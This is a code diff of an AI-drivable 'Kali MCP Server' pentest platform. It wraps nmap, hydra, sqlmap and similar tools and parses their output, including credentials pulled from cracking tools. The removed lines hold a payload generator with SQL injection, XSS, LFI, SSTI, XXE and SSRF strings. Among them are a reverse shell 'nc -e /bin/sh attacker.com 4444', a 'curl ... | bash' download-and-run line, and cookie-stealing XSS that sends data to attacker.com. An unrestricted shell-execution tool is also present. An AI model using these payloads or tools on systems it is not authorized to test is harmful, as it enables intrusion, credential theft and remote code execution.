+            (r"(?:secret|token)\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{16,})", "secret_leak"),
+            (r"(?:jdbc|mysql|postgres|mongodb)://[^\s<\"']+", "connection_string"),
+            (r"/(?:home|var|opt|usr)/[\w/.\-]+\.(?:py|rb|php|js|java|conf|yml|xml|env)", "file_path_leak"),
+            (r"(?:AWS_ACCESS_KEY|AKIA)[A-Z0-9]{16,}", "aws_key_leak"),
+            (r"(?:BEGIN RSA PRIVATE KEY|BEGIN OPENSSH PRIVATE KEY)", "private_key_leak"),
+            (r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b(?!\.)", "internal_ip_leak"),
+            (r"(?:SQL syntax|mysql_fetch|pg_query|ORA-\d{5})", "sql_error_leak"),
+        ]
+        for pattern, leak_type in leak_patterns:
+            matches = re.findall(pattern, html, re.IGNORECASE)
+            if matches:
+                findings["info_leaks"].append({
+                    "type": leak_type, "count": len(matches),
+                    "samples": [m[:50] if isinstance(m, str) else str(m)[:50] for m in matches[:3]],
+                })
+
+        # Stack trace extraction
+        stack_patterns = [
+            r"(?:Traceback.*?(?:\n.*?)+(?:Error|Exception).*)",
+            r"(?:at\s+[\w.$]+\([\w.]+:\d+\)(?:\n\s*at.*)*)",
+            r"(?:Stack trace:.*?(?:\n.*?){1,20})",
+        ]
+        for pattern in stack_patterns:
+            matches = re.findall(pattern, html, re.DOTALL)
+            for m in matches[:2]:
+                findings["stack_traces"].append(m[:500])
+                findings["debug_mode"] = True
+
+        return findings
+
+    @staticmethod
+    def parse_nuclei_output(output: str) -> List[Dict]:
+        """Parse nuclei findings into structured vulnerability data"""
+        findings = []
+        for line in output.split("\n"):
+            line = line.strip()
+            if not line or line.startswith("[INF]"):
+                continue
+            # nuclei output: [severity] [template-id] [protocol] url [matched-at] [extra-info]
+            match = re.match(
+                r"\[(\w+)\]\s+\[([^\]]+)\]\s+\[([^\]]+)\]\s+(.+?)(?:\s+\[(.+)\])?$",
+                line
+            )
+            if match:
+                severity, template_id, protocol, url, extra = match.groups()
+                findings.append({
+                    "severity": severity.lower(),
+                    "template": template_id,
+                    "protocol": protocol,
+                    "url": url.strip(),
+                    "extra": extra or "",
+                    "cves": re.findall(r"CVE-\d{4}-\d{4,7}", line),
+                })
+        return findings
+
+    @staticmethod
+    def extract_credentials_from_output(output: str) -> List[Dict]:
+        """Extract credentials from any tool output"""
+        creds = []
+        patterns = [
+            # hydra: [port][service] host: X login: Y password: Z
+            (r"\[(\d+)\]\[(\w+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S+)",
+             lambda m: {"port": m[0], "service": m[1], "host": m[2], "username": m[3], "password": m[4]}),
+            # john: password (username)
+            (r"^(\S+)\s+\((\S+)\)\s*$",
+             lambda m: {"password": m[0], "username": m[1]}),
+            # hashcat: hash:password
+            (r"^([a-f0-9]{32,}):(.+)$",
+             lambda m: {"hash": m[0], "password": m[1]}),
+            # secretsdump: domain\user:rid:lmhash:nthash
+            (r"^(\S+\\?\S+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::",
+             lambda m: {"account": m[0], "rid": m[1], "lm_hash": m[2], "nt_hash": m[3]}),
+            # impacket format: user:password
+            (r"^\[.\]\s+(\S+):(\S+)\s*$",
+             lambda m: {"username": m[0], "password": m[1]}),
+        ]
+        for line in output.split("\n"):
+            line = line.strip()
+            for pattern, extractor in patterns:
+                match = re.findall(pattern, line, re.MULTILINE)
+                for m in match:
+                    creds.append(extractor(m if isinstance(m, tuple) else (m,)))
+        return creds
+
+
+class ParallelExecutor:
+    """Execute independent tool modules in parallel with coordination"""
+
+    @staticmethod
+    async def run_parallel(tasks: List[Dict], max_concurrent: int = 5) -> List[Dict]:
+        """Run multiple async tool calls in parallel
+        tasks: [{"name": "recon", "coro": coroutine, "timeout": 300}, ...]
+        """
+        semaphore = asyncio.Semaphore(max_concurrent)
+        results = []
+
+        async def _run_one(task: Dict) -> Dict:
+            async with semaphore:
+                name = task["name"]
+                t0 = time.time()
+                try:
+                    result = await asyncio.wait_for(task["coro"], timeout=task.get("timeout", 300))
+                    elapsed = round(time.time() - t0, 1)
+                    return {"name": name, "status": "success", "result": result, "elapsed_s": elapsed}
+                except asyncio.TimeoutError:
+                    return {"name": name, "status": "timeout", "result": None, "elapsed_s": task.get("timeout", 300)}
+                except Exception as e:
+                    elapsed = round(time.time() - t0, 1)
+                    return {"name": name, "status": "error", "error": str(e), "elapsed_s": elapsed}
+
+        gathered = await asyncio.gather(*[_run_one(t) for t in tasks], return_exceptions=True)
+        for item in gathered:
+            if isinstance(item, Exception):
+                results.append({"name": "unknown", "status": "exception", "error": str(item)})
+            else:
+                results.append(item)
+        return results
+
+
+# ============================================================================
+# GLOBAL INSTANCES
+# ============================================================================
+
+session_manager = SessionManager()
+pentest_memory = PentestMemory()
+rate_limit_detector = RateLimitDetector()
+orchestrator = IntelligentOrchestrator(pentest_memory, rate_limit_detector)
+vuln_correlator = VulnCorrelator(pentest_memory)
+kill_chain = KillChainTracker(pentest_memory)
+deep_parser = DeepOutputParser()
+parallel_executor = ParallelExecutor()
 
 # ============================================================================
 # UTILITY FUNCTIONS
@@ -792,8754 +1220,3176 @@ def generate_execution_id() -> str:
     return f"{generate_timestamp()}_{uuid.uuid4().hex[:8]}"
 
 def sanitize_filename(name: str) -> str:
-    """Sanitize string for use as filename"""
-    return re.sub(r'[^\w\-.]', '_', name.replace('://', '_').replace('/', '_'))[:100]
+    return re.sub(r"[^\w.\-]", "_", name.replace("://", "_").replace("/", "_"))[:100]
 
-def _truncate_dict(d: Any, max_str_len: int = 500) -> Any:
-    """Truncate strings in a dict structure for trace logging"""
-    if isinstance(d, str):
-        return d[:max_str_len] + "..." if len(d) > max_str_len else d
-    elif isinstance(d, dict):
-        return {k: _truncate_dict(v, max_str_len) for k, v in d.items()}
-    elif isinstance(d, list):
-        return [_truncate_dict(item, max_str_len) for item in d[:50]]
-    return d
 
-def run_command_advanced(
-    command: Any,
-    timeout: int = 600,
-    env: Optional[Dict] = None,
-    cwd: Optional[str] = None,
-    shell: bool = False,
-    trace: Optional[TraceLogger] = None
-) -> Dict[str, Any]:
-    """
-    Advanced command execution with tracing, error handling, and timeout management.
-    """
-    start_time = datetime.datetime.now()
-    cmd_str = command if isinstance(command, str) else ' '.join(command)
-    
-    if trace:
-        trace.info("cmd_start", f"Executing: {cmd_str[:200]}")
-    
-    logger.info(f"Executing: {cmd_str[:200]}")
-    
+async def run_command(cmd: List[str], timeout: int = 300, cwd: str = None) -> Dict:
+    """Universal command runner with timeout, logging, and error handling"""
+    start = time.time()
     try:
-        process_env = os.environ.copy()
-        if env:
-            process_env.update(env)
-        
-        if shell and isinstance(command, list):
-            command = ' '.join(command)
-        
-        result = subprocess.run(
-            command,
-            capture_output=True,
-            text=True,
-            timeout=timeout,
-            check=False,
-            env=process_env,
+        proc = await asyncio.create_subprocess_exec(
+            *cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
             cwd=cwd,
-            shell=shell
         )
-        
-        execution_time = (datetime.datetime.now() - start_time).total_seconds()
-        
-        output = {
-            "stdout": result.stdout.strip() if result.stdout else "",
-            "stderr": result.stderr.strip() if result.stderr else "",
-            "return_code": result.returncode,
-            "execution_time": execution_time,
-            "success": result.returncode == 0,
-            "command": cmd_str
-        }
-        
-        if trace:
-            trace.command(cmd_str, output)
-        
-        return output
-        
-    except subprocess.TimeoutExpired as e:
-        logger.error(f"Command timed out after {timeout}s: {cmd_str[:100]}")
-        output = {
-            "stdout": e.stdout.decode() if e.stdout else "",
-            "stderr": f"TIMEOUT: Command exceeded {timeout} seconds",
-            "return_code": -1,
-            "execution_time": timeout,
-            "success": False,
-            "command": cmd_str
-        }
-        if trace:
-            trace.error("cmd_timeout", f"Timeout after {timeout}s", output)
-        return output
-        
-    except FileNotFoundError:
-        cmd_name = command[0] if isinstance(command, list) else command.split()[0]
-        logger.error(f"Command not found: {cmd_name}")
-        output = {
-            "stdout": "",
-            "stderr": f"Command not found: {cmd_name}. Ensure the tool is installed.",
-            "return_code": -1,
-            "execution_time": 0,
-            "success": False,
-            "command": cmd_str
-        }
-        if trace:
-            trace.error("cmd_not_found", f"Tool not installed: {cmd_name}", output)
-        return output
-        
-    except Exception as e:
-        logger.error(f"Command error: {e}")
-        output = {
-            "stdout": "",
-            "stderr": str(e),
-            "return_code": -1,
-            "execution_time": 0,
-            "success": False,
-            "command": cmd_str
-        }
-        if trace:
-            trace.error("cmd_exception", str(e), output)
-        return output
-
-def verify_output(
-    file_path: str,
-    expected_format: str = "text",
-    min_size: int = 10,
-    required_patterns: Optional[List[str]] = None
-) -> Dict[str, Any]:
-    """Verify output file exists and contains valid data"""
-    result = {
-        "valid": False,
-        "file_exists": False,
-        "file_size": 0,
-        "format_valid": False,
-        "has_data": False,
-        "error": None
-    }
-    
-    try:
-        if not os.path.exists(file_path):
-            result["error"] = f"File not found: {file_path}"
-            return result
-        
-        result["file_exists"] = True
-        result["file_size"] = os.path.getsize(file_path)
-        
-        if result["file_size"] < min_size:
-            result["error"] = f"File too small ({result['file_size']} bytes)"
-            return result
-        
-        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-        
-        if not content.strip():
-            result["error"] = "File is empty"
-            return result
-        
-        if expected_format == "xml":
-            try:
-                ET.fromstring(content)
-                result["format_valid"] = True
-            except ET.ParseError as e:
-                result["error"] = f"Invalid XML: {e}"
-                return result
-        elif expected_format == "json":
-            try:
-                json.loads(content)
-                result["format_valid"] = True
-            except json.JSONDecodeError as e:
-                result["error"] = f"Invalid JSON: {e}"
-                return result
-        else:
-            result["format_valid"] = True
-        
-        if required_patterns:
-            content_lower = content.lower()
-            for pattern in required_patterns:
-                if pattern.lower() in content_lower:
-                    result["has_data"] = True
-                    break
-        else:
-            result["has_data"] = True
-        
-        result["valid"] = result["format_valid"] and result["has_data"]
-        return result
-        
-    except Exception as e:
-        result["error"] = str(e)
-        return result
-
-
-# ============================================================================
-# TOOL EXECUTION WRAPPER - Unified execution with trace + progress + chaining
-# ============================================================================
-
-# Global instances
-session_mgr = SessionManager()
-chain_engine = ToolChainEngine()
-
-def log_tool_execution(tool_name: str, target: str, inputs: Dict, outputs: Dict,
-                       trace: Optional[TraceLogger] = None,
-                       progress: Optional[ProgressReporter] = None):
-    """
-    Unified logging: stores execution to hierarchical session directory.
-    """
-    execution_id = generate_execution_id()
-    exec_dir = session_mgr.get_execution_dir(target, tool_name, execution_id)
-    
-    execution_record = {
-        "tool": tool_name,
-        "session_id": session_mgr.get_session_id(),
-        "target": target,
-        "execution_id": execution_id,
-        "timestamp": datetime.datetime.now().isoformat(),
-        "inputs": inputs,
-        "outputs": outputs,
-        "trace_entries": trace.get_traces() if trace else [],
-        "progress_steps": progress.get_progress() if progress else [],
-        "trace_count": len(trace.get_traces()) if trace else 0
-    }
-    
-    try:
-        # Write execution record
-        exec_file = os.path.join(exec_dir, "execution.json")
-        with open(exec_file, 'w') as f:
-            json.dump(execution_record, f, indent=2, default=str)
-        
-        # Write raw output separately for large outputs
-        raw_file = os.path.join(exec_dir, "raw_output.txt")
-        raw_output = outputs.get("raw_output", "") or outputs.get("stdout", "")
-        if isinstance(raw_output, str):
-            with open(raw_file, 'w') as f:
-                f.write(raw_output)
-        
-        # Store in chain engine for cross-referencing
-        chain_engine.store_result(tool_name, target, outputs)
-        
-        logger.info(f"Logged {tool_name} -> {exec_dir}")
-    except Exception as e:
-        logger.error(f"Failed to log {tool_name}: {e}")
-
-
-# ============================================================================
-# PAYLOAD GENERATORS
-# ============================================================================
-
-class PayloadGenerator:
-    """Advanced payload generation for various attack vectors"""
-    
-    @staticmethod
-    def sql_injection_payloads(db_type: str = "generic") -> List[str]:
-        generic = [
-            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
-            "' OR 1=1--", "' OR 1=1#", "admin'--",
-            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
-            "' UNION SELECT NULL,NULL,NULL--",
-            "1' ORDER BY 1--", "1' ORDER BY 10--",
-            "' AND 1=1--", "' AND 1=2--",
-            "'; DROP TABLE users--",
-            "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,SHA1('test'))--",
-            "' WAITFOR DELAY '0:0:5'--",
-            "1; EXEC xp_cmdshell('whoami')--",
-            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
-            # Time-based blind
-            "' AND IF(1=1,SLEEP(3),0)--",
-            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--",
-            # Error-based
-            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
-            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-        ]
-        mysql_specific = [
-            "' UNION SELECT @@version--",
-            "' UNION SELECT user()--",
-            "' UNION SELECT database()--",
-            "' UNION SELECT table_name FROM information_schema.tables--",
-            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
-            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
-            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
-        ]
-        mssql_specific = [
-            "'; EXEC sp_configure 'show advanced options',1--",
-            "'; EXEC xp_cmdshell 'dir'--",
-            "' UNION SELECT name FROM master..sysdatabases--",
-            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
-        ]
-        postgres_specific = [
-            "'; SELECT pg_sleep(5)--",
-            "' UNION SELECT version()--",
-            "' UNION SELECT current_database()--",
-            "' UNION SELECT usename FROM pg_user--",
-            "'; COPY (SELECT '') TO PROGRAM 'id'--",
-        ]
-        if db_type == "mysql": return generic + mysql_specific
-        elif db_type == "mssql": return generic + mssql_specific
-        elif db_type == "postgres": return generic + postgres_specific
-        return generic
-    
-    @staticmethod
-    def xss_payloads() -> List[str]:
-        return [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "<body onload=alert('XSS')>",
-            "<iframe src='javascript:alert(1)'>",
-            "javascript:alert('XSS')",
-            "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
-            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
-            "'-alert('XSS')-'",
-            "\"><script>alert('XSS')</script>",
-            "'><script>alert('XSS')</script>",
-            "<ScRiPt>alert('XSS')</ScRiPt>",
-            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
-            "<<script>script>alert('XSS')<</script>/script>",
-            "<svg/onload=alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>",
-            "<marquee onstart=alert('XSS')>",
-            "<video><source onerror=alert('XSS')>",
-            # DOM-based
-            "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>",
-            "<svg><animate onbegin=alert('XSS') attributeName=x>",
-            # Polyglot
-            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0teleport//{{.teleport}}/>",
-        ]
-    
-    @staticmethod
-    def lfi_payloads() -> List[str]:
-        return [
-            "../../../../etc/passwd",
-            "....//....//....//etc/passwd",
-            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-            "..%252F..%252F..%252Fetc%252Fpasswd",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "....\\\\....\\\\....\\\\etc/passwd",
-            "..%c0%af..%c0%af..%c0%afetc/passwd",
-            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
-            "/etc/passwd%00", "/etc/passwd%00.jpg",
-            "php://filter/convert.base64-encode/resource=/etc/passwd",
-            "php://filter/read=string.rot13/resource=/etc/passwd",
-            "php://input",
-            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
-            "expect://whoami",
-            "/proc/self/environ",
-            "/var/log/apache2/access.log",
-            "/var/log/nginx/access.log",
-            # Windows
-            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-            "..\\..\\..\\..\\windows\\win.ini",
-        ]
-    
-    @staticmethod
-    def command_injection_payloads() -> List[str]:
-        return [
-            "; whoami", "| whoami", "|| whoami", "&& whoami", "& whoami",
-            "`whoami`", "$(whoami)",
-            "; cat /etc/passwd", "| cat /etc/passwd",
-            "; id", "| id", "; uname -a", "| uname -a",
-            "; ls -la", "| ls -la",
-            "; nc -e /bin/sh attacker.com 4444",
-            "; curl http://attacker.com/shell.sh | bash",
-            # Blind injection
-            "; sleep 5", "| sleep 5", "&& sleep 5",
-            "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
-            # Bypass attempts
-            ";${IFS}whoami", ";\twhoami", "%0awhoami",
-            "$(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
-        ]
-    
-    @staticmethod
-    def ssti_payloads() -> List[str]:
-        return [
-            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
-            "{{config}}", "{{self.__class__.__mro__[2].__subclasses__()}}",
-            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
-            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
-            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
-            "{{config.items()}}", "{{request.environ}}",
-            "{{lipsum.__globals__['os'].popen('id').read()}}",
-            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-            # Jinja2 specific
-            "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}",
-        ]
-    
-    @staticmethod
-    def xxe_payloads() -> List[str]:
-        return [
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>',
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>',
-        ]
-
-    @staticmethod
-    def ssrf_payloads() -> List[str]:
-        return [
-            "http://169.254.169.254/latest/meta-data/",
-            "http://127.0.0.1/", "http://0.0.0.0/",
-            "http://[::1]/", "file:///etc/passwd",
-            "gopher://127.0.0.1:25/", "dict://127.0.0.1:6379/info",
-        ]
-
-    @staticmethod
-    def auth_bypass_payloads() -> List[str]:
-        return [
-            "admin' --", "admin'/*", "' OR 1=1--",
-            "admin", "password", "admin:admin",
-            "' OR ''='", "') OR ('1'='1",
-        ]
-
-    @staticmethod
-    def get_payloads(category: str = "all") -> Dict[str, List[str]]:
-        """Get payloads by category or all."""
-        all_payloads = {
-            "sqli": PayloadGenerator.sql_injection_payloads(),
-            "xss": PayloadGenerator.xss_payloads(),
-            "lfi": PayloadGenerator.lfi_payloads(),
-            "rce": PayloadGenerator.command_injection_payloads(),
-            "ssti": PayloadGenerator.ssti_payloads(),
-            "xxe": PayloadGenerator.xxe_payloads(),
-            "ssrf": PayloadGenerator.ssrf_payloads(),
-            "auth_bypass": PayloadGenerator.auth_bypass_payloads(),
-        }
-        if category == "all":
-            return all_payloads
-        return {category: all_payloads.get(category, [])}
-
-
-# ============================================================================
-# FASTMCP SERVER INITIALIZATION
-# ============================================================================
-
-mcp = FastMCP("Kali MCP Server v4 - Professional Pentest & Bug Bounty Platform")
-
-# Decorator for session reference resolution
-def resolve_references(func):
-    @wraps(func)
-    async def wrapper(*args, **kwargs):
-        resolved_kwargs = {}
-        for key, value in kwargs.items():
-            if isinstance(value, str) and value.startswith("@session:"):
-                try:
-                    resolved_kwargs[key] = resolve_session_reference(value)
-                except Exception as e:
-                    logger.warning(f"Could not resolve reference '{value}': {e}")
-                    resolved_kwargs[key] = value
-            else:
-                resolved_kwargs[key] = value
-        return await func(*args, **resolved_kwargs)
-    return wrapper
-
-def resolve_session_reference(reference: str) -> Any:
-    """Resolve session reference to actual value"""
-    if not reference.startswith("@session:"):
-        return reference
-    parts = reference.split(":")
-    if len(parts) != 3:
-        raise ValueError(f"Invalid reference format: {reference}")
-    _, tool_name, output_key = parts
-    
-    # Look in chain engine first
-    for key, entry in chain_engine.results_store.items():
-        if entry["tool"] == tool_name:
-            result = entry["result"]
-            keys = output_key.split(".")
-            value = result
-            for k in keys:
-                if isinstance(value, dict) and k in value:
-                    value = value[k]
-                elif isinstance(value, list) and k.isdigit():
-                    value = value[int(k)]
-                else:
-                    raise ValueError(f"Key '{output_key}' not found in {tool_name} result")
-            return value
-    
-    raise ValueError(f"No stored result for tool '{tool_name}'")
-
-# Helper: create trace+progress context for a tool
-def _init_tool_context(tool_name: str, target: str, total_steps: int = 5):
-    """Initialize trace logger and progress reporter for a tool execution"""
-    exec_id = generate_execution_id()
-    exec_dir = session_mgr.get_execution_dir(target, tool_name, exec_id)
-    trace = TraceLogger(exec_dir, tool_name)
-    progress = ProgressReporter(tool_name, total_steps, trace)
-    trace.info("init", f"Starting {tool_name} on target: {target}")
-    return trace, progress, exec_dir
-
-
-# ============================================================================
-# CORE SESSION & MANAGEMENT TOOLS
-# ============================================================================
-
-@mcp.tool()
-async def start_session(session_name: Optional[str] = None) -> str:
-    """Start a new pentest session for organized result storage.
-    All subsequent tool results will be stored under this session."""
-    session_id = session_mgr.start_session(session_name)
-    result = {
-        "status": "success",
-        "session_id": session_id,
-        "session_dir": os.path.join(SESSIONS_DIR, session_id),
-        "message": f"Session '{session_id}' started. All logs stored per-session/per-target.",
-        "storage_structure": "sessions/{session_id}/{target}/{tool}/{execution_id}/"
-    }
-    return json.dumps(result, indent=2)
-
-@mcp.tool()
-async def server_health() -> str:
-    """Check server status, available tools, session info, and chain state"""
-    tools = [
-        "nmap", "gobuster", "dirb", "nikto", "sqlmap", "msfconsole",
-        "hydra", "john", "hashcat", "wpscan", "enum4linux", "amass",
-        "dnsrecon", "theharvester", "whatweb", "wfuzz", "ffuf",
-        "nuclei", "subfinder", "httpx", "curl", "wget", "vulnx"
-    ]
-    tool_status = {}
-    for tool in tools:
-        result = run_command_advanced(["which", tool], timeout=5)
-        tool_status[tool] = {
-            "available": result["success"],
-            "path": result["stdout"] if result["success"] else None
-        }
-    
-    available = [t for t, s in tool_status.items() if s["available"]]
-    missing = [t for t, s in tool_status.items() if not s["available"]]
-    
-    result = {
-        "status": "success",
-        "version": "v4.0 - Professional Pentest & Bug Bounty Platform",
-        "architecture": {
-            "session_manager": "hierarchical per-session/per-target logging",
-            "trace_logger": "forensic-level execution tracing",
-            "progress_reporter": "real-time progress feedback",
-            "tool_chain_engine": "cross-referencing & auto-enrichment",
-            "cve_cartographer": "service-to-CVE mapping with patches",
-            "input_validator": "security-hardened input sanitization"
-        },
-        "available_tools": available,
-        "missing_tools": missing,
-        "total_available": len(available),
-        "total_missing": len(missing),
-        "session_active": session_mgr.current_session_id is not None,
-        "current_session": session_mgr.current_session_id,
-        "chain_store_entries": len(chain_engine.results_store)
-    }
-    return json.dumps(result, indent=2)
-
-@mcp.tool()
-@resolve_references
-async def execute_command(
-    command: str,
-    timeout: int = 600,
-    working_dir: Optional[str] = None
-) -> str:
-    """Execute a shell command with full tracing and security validation.
-    WARNING: Commands are logged with forensic trace for audit."""
-    target = "localhost"
-    trace, progress, exec_dir = _init_tool_context("execute_command", target, 3)
-    
-    inputs = {"command": command, "timeout": timeout, "working_dir": working_dir}
-    
-    progress.update("Validating command", command[:80])
-    timeout = InputValidator.validate_timeout(timeout)
-    
-    progress.update("Executing command")
-    result = run_command_advanced(command, timeout=timeout, cwd=working_dir, shell=True, trace=trace)
-    
-    output = {
-        "status": "success" if result["success"] else "error",
-        "command": command,
-        "stdout": result["stdout"],
-        "stderr": result["stderr"],
-        "return_code": result["return_code"],
-        "execution_time": result["execution_time"]
-    }
-    
-    progress.update("Logging results")
-    log_tool_execution("execute_command", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-@mcp.tool()
-async def get_chain_summary(target: str) -> str:
-    """Get cross-reference summary for a target - shows all tools run and their relationships"""
-    summary = chain_engine.get_chain_summary(target)
-    summary["status"] = "success"
-    return json.dumps(summary, indent=2)
-
-@mcp.tool()
-async def session_summary() -> str:
-    """Get current session summary with all targets and tools executed"""
-    session_id = session_mgr.get_session_id()
-    targets = session_mgr.list_session_targets()
-    result = {
-        "status": "success",
-        "session_id": session_id,
-        "targets": {t: {"tool_runs": len(runs), "tools": [r["tool"] for r in runs]} for t, runs in targets.items()},
-        "total_targets": len(targets),
-        "total_executions": sum(len(runs) for runs in targets.values()),
-        "chain_entries": len(chain_engine.results_store)
-    }
-    return json.dumps(result, indent=2)
-
-
-# ============================================================================
-# NETWORK RECONNAISSANCE TOOLS (DEEPENED)
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def nmap_scan(
-    target: str, scan_type: str = "comprehensive", ports: Optional[str] = None,
-    scripts: Optional[str] = None, intensity: str = "medium",
-    output_file: Optional[str] = None, additional_args: str = "",
-    timeout: int = 900, auto_cve_map: bool = True
-) -> str:
-    """Advanced Nmap scanning with CVE auto-mapping and chain enrichment.
-    Scan types: quick, basic, comprehensive, stealth, vuln, udp, aggressive.
-    Set auto_cve_map=True to automatically map discovered services to CVEs."""
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("nmap_scan", target, 8)
-    inputs = {"target": target, "scan_type": scan_type, "ports": ports,
-              "scripts": scripts, "intensity": intensity, "timeout": timeout, "auto_cve_map": auto_cve_map}
-
-    scan_profiles = {
-        "quick": ["-F", "-T4", "--open"],
-        "basic": ["-sV", "-sC", "-T3"],
-        "comprehensive": ["-sV", "-sC", "-O", "-A", "--version-all"],
-        "stealth": ["-sS", "-T2", "-f", "--data-length", "50"],
-        "vuln": ["-sV", "--script=vuln,exploit,auth", "-T3"],
-        "udp": ["-sU", "-sV", "--top-ports", "100", "-T4"],
-        "aggressive": ["-sS", "-sV", "-sC", "-O", "-A", "-T4", "--script=default,vuln"]
-    }
-    intensity_timing = {"stealth": "-T1", "low": "-T2", "medium": "-T3", "high": "-T4", "aggressive": "-T5"}
-
-    if scan_type not in scan_profiles:
-        return json.dumps({"status": "error", "message": f"Invalid scan_type. Choose from: {list(scan_profiles.keys())}"})
-
-    progress.update("Preparing scan", f"Type: {scan_type}, Target: {target}")
-
-    if not output_file:
-        timestamp = generate_timestamp()
-        output_file = os.path.join(exec_dir, "artifacts", f"nmap_{sanitize_filename(target)}_{timestamp}.xml")
-
-    cmd = ["nmap"] + scan_profiles[scan_type]
-    if intensity in intensity_timing and "-T" not in str(scan_profiles[scan_type]):
-        cmd.append(intensity_timing[intensity])
-    if ports:
-        cmd.extend(["-p", ports])
-    elif scan_type == "comprehensive":
-        cmd.extend(["-p-"])
-    if scripts:
-        cmd.extend(["--script", scripts])
-    cmd.extend(["-oX", output_file, "-oN", output_file.replace(".xml", ".txt")])
-    if additional_args:
-        cmd.extend(shlex.split(additional_args))
-    cmd.append(target)
-
-    progress.update("Executing nmap scan", f"Command: {' '.join(cmd[:6])}...")
-    trace.info("scan_config", "Nmap configuration", {"profile": scan_type, "ports": ports, "scripts": scripts})
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-
-    progress.update("Parsing XML results")
-    parsed_data = {"hosts": [], "ports": [], "services": [], "os_matches": [], "scripts": []}
-
-    if os.path.exists(output_file):
         try:
-            with open(output_file, 'r') as f:
-                content = f.read()
-            root = ET.fromstring(content)
-            for host in root.findall("host"):
-                host_info = {"addresses": [], "hostnames": [], "ports": [], "os": [], "status": "unknown"}
-                status = host.find("status")
-                if status is not None:
-                    host_info["status"] = status.get("state", "unknown")
-                for addr in host.findall("address"):
-                    host_info["addresses"].append({"addr": addr.get("addr"), "type": addr.get("addrtype")})
-                for hostname in host.findall("hostnames/hostname"):
-                    host_info["hostnames"].append(hostname.get("name"))
-                for port in host.findall("ports/port"):
-                    port_info = {
-                        "port": port.get("portid"), "protocol": port.get("protocol"),
-                        "state": "unknown", "service": "unknown",
-                        "product": None, "version": None, "extrainfo": None, "scripts": []
-                    }
-                    state = port.find("state")
-                    if state is not None:
-                        port_info["state"] = state.get("state")
-                    service = port.find("service")
-                    if service is not None:
-                        port_info["service"] = service.get("name", "unknown")
-                        port_info["product"] = service.get("product")
-                        port_info["version"] = service.get("version")
-                        port_info["extrainfo"] = service.get("extrainfo")
-                    for script in port.findall("script"):
-                        script_data = {"id": script.get("id"), "output": script.get("output", "")[:500]}
-                        port_info["scripts"].append(script_data)
-                        parsed_data["scripts"].append(script_data)
-                    host_info["ports"].append(port_info)
-                    if port_info["state"] == "open":
-                        parsed_data["ports"].append(f"{port_info['port']}/{port_info['protocol']}")
-                        parsed_data["services"].append({
-                            "port": port_info["port"], "service": port_info["service"],
-                            "product": port_info["product"], "version": port_info["version"]
-                        })
-                for osmatch in host.findall("os/osmatch"):
-                    os_info = {"name": osmatch.get("name"), "accuracy": osmatch.get("accuracy")}
-                    host_info["os"].append(os_info)
-                    parsed_data["os_matches"].append(os_info)
-                parsed_data["hosts"].append(host_info)
